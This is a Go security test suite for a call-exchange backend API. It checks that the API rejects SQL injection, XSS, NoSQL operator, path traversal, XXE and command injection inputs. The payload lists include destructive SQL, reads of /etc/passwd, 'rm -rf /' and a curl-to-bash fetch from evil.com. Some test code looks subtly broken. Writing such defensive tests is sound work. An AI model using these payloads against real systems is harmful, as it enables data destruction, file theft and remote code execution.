//go:build security

package security

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/davidleathers/dependable-call-exchange-backend/test/e2e/infrastructure"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSecurity_InputValidation(t *testing.T) {
	env := infrastructure.NewTestEnvironment(t)
	client := infrastructure.NewAPIClient(t, env.APIURL)
	
	buyer := createTestUser(t, client, "buyer@test.com", "buyer")
	client.SetToken(buyer.Token)
	
	t.Run("SQL Injection Prevention", func(t *testing.T) {
		sqlInjectionPayloads := []string{
			"'; DROP TABLE calls; --",
			"1' OR '1'='1",
			"admin'--",
			"1; UPDATE accounts SET balance = 999999",
			"' UNION SELECT * FROM accounts --",
			"'; DELETE FROM calls WHERE '1'='1",
			"1' AND (SELECT COUNT(*) FROM accounts) > 0 --",
		}
		
		for _, payload := range sqlInjectionPayloads {
			t.Run(fmt.Sprintf("payload: %s", payload[:20]), func(t *testing.T) {
				// Test in various endpoints
				// 1. Call creation with SQL injection in phone number
				resp := client.Post("/api/v1/calls", map[string]interface{}{
					"from_number": payload,
					"to_number":   "+18005551234",
					"direction":   "inbound",
				})
				
				// Should fail validation, not execute SQL
				assert.Equal(t, 400, resp.StatusCode)
				var errResp map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&errResp)
				assert.Contains(t, strings.ToLower(extractErrorMessage(errResp)), "invalid")
				
				// 2. Search with SQL injection
				resp = client.Get("/api/v1/calls?search=" + payload)
				assert.NotEqual(t, 500, resp.StatusCode, "SQL injection should not cause server error")
				
				// 3. Account update with SQL injection
				resp = client.Put("/api/v1/account", map[string]interface{}{
					"company_name": payload,
				})
				// Should either validate or sanitize, but not execute SQL
				assert.NotEqual(t, 500, resp.StatusCode)
			})
		}
		
		// Verify database integrity after SQL injection attempts
		resp := client.Get("/api/v1/account/balance")
		assert.Equal(t, 200, resp.StatusCode, "Account should still be accessible")
	})
	
	t.Run("XSS Prevention", func(t *testing.T) {
		xssPayloads := []string{
			"<script>alert('XSS')</script>",
			"javascript:alert('XSS')",
			"<img src=x onerror=alert('XSS')>",
			"<iframe src='javascript:alert(\"XSS\")'></iframe>",
			"<body onload=alert('XSS')>",
			"<svg/onload=alert('XSS')>",
			"<input type=\"text\" onfocus=\"alert('XSS')\">",
		}
		
		for _, payload := range xssPayloads {
			t.Run(fmt.Sprintf("payload: %s", payload[:20]), func(t *testing.T) {
				// Create account with XSS payload
				resp := client.Put("/api/v1/account", map[string]interface{}{
					"company_name": payload,
				})
				
				// Get the account back
				resp = client.Get("/api/v1/account")
				require.Equal(t, 200, resp.StatusCode)
				
				body, err := json.Marshal(resp.Body)
				require.NoError(t, err)
				bodyStr := string(body)
				
				// Check response doesn't reflect unescaped payload
				assert.NotContains(t, bodyStr, "<script>")
				assert.NotContains(t, bodyStr, "javascript:")
				assert.NotContains(t, bodyStr, "onerror=")
				assert.NotContains(t, bodyStr, "onload=")
				
				// If the payload is returned, it should be HTML-escaped
				if strings.Contains(bodyStr, "XSS") {
					assert.Contains(t, bodyStr, "&lt;script&gt;", "Script tags should be escaped")
				}
			})
		}
	})
	
	t.Run("NoSQL Injection Prevention", func(t *testing.T) {
		// Test MongoDB-style injection attempts
		noSQLPayloads := []interface{}{
			map[string]interface{}{"$ne": nil},
			map[string]interface{}{"$gt": ""},
			map[string]interface{}{"$regex": ".*"},
			map[string]interface{}{"$where": "function() { return true; }"},
		}
		
		for i, payload := range noSQLPayloads {
			t.Run(fmt.Sprintf("payload_%d", i), func(t *testing.T) {
				// Attempt to inject in search parameters
				resp := client.Post("/api/v1/calls/search", map[string]interface{}{
					"criteria": payload,
				})
				
				// Should either reject or sanitize
				assert.Contains(t, []int{400, 422}, resp.StatusCode,
					"NoSQL injection attempts should be rejected")
			})
		}
	})
	
	t.Run("Path Traversal Prevention", func(t *testing.T) {
		pathTraversalPayloads := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"....//....//....//etc//passwd",
			"file:///etc/passwd",
		}
		
		for _, payload := range pathTraversalPayloads {
			t.Run(fmt.Sprintf("payload: %s", payload[:15]), func(t *testing.T) {
				// Attempt path traversal in file-related endpoints
				resp := client.Get("/api/v1/reports/download?file=" + payload)
				assert.Contains(t, []int{400, 403, 404}, resp.StatusCode,
					"Path traversal should be blocked")
				
				// Verify error doesn't expose system paths
				var errResp map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&errResp)
				errorMsg := extractErrorMessage(errResp)
				assert.NotContains(t, errorMsg, "/etc/")
				assert.NotContains(t, errorMsg, "\\windows\\")
			})
		}
	})
	
	t.Run("Command Injection Prevention", func(t *testing.T) {
		commandInjectionPayloads := []string{
			"; ls -la",
			"| cat /etc/passwd",
			"&& rm -rf /",
			"`whoami`",
			"$(curl evil.com/shell.sh | bash)",
			"; ping -c 10 google.com",
		}
		
		for _, payload := range commandInjectionPayloads {
			t.Run(fmt.Sprintf("payload: %s", payload[:10]), func(t *testing.T) {
				// Test in any endpoint that might process system commands
				resp := client.Post("/api/v1/reports/generate", map[string]interface{}{
					"name":   payload,
					"format": "pdf",
				})
				
				// Should reject or sanitize
				assert.NotEqual(t, 500, resp.StatusCode,
					"Command injection should not cause server error")
				assert.Contains(t, []int{400, 422}, resp.StatusCode,
					"Command injection attempts should be rejected")
			})
		}
	})
	
	t.Run("XXE (XML External Entity) Prevention", func(t *testing.T) {
		xxePayload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>`
		
		// If the API accepts XML
		req := NewRequest("POST", env.APIURL+"/api/v1/data/import", xxePayload)
		req.Header.Set("Content-Type", "application/xml")
		req.Header.Set("Authorization", "Bearer "+buyer.Token)
		
		resp, err := http.DefaultClient.Do(req)
		require.NoError(t, err)
		defer resp.Body.Close()
		
		// Should reject XXE attempts
		assert.Contains(t, []int{400, 415, 422}, resp.StatusCode,
			"XXE attempts should be rejected")
	})
}
